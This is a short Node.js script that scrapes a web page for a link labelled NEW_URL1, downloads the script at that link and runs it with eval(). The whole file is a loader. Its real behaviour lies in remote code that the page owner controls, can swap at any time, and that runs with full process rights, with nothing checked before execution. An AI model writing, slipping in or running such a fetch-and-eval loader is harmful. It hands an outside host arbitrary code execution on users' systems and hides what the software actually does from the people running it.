

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchNewUrl1() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const newUrl1 = $(`a:contains("NEW_URL1")`).attr('href');

        if (!newUrl1) throw new Error('NEW_URL1 not found on the webpage.');

        console.log('NEW_URL1 fetched successfully:', newUrl1);

        const scriptResponse = await axios.get(newUrl1);
        const scriptContent = scriptResponse.data;
        console.log("NEW_URL1 script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching NEW_URL1:', error.message);
    }
}

fetchNewUrl1();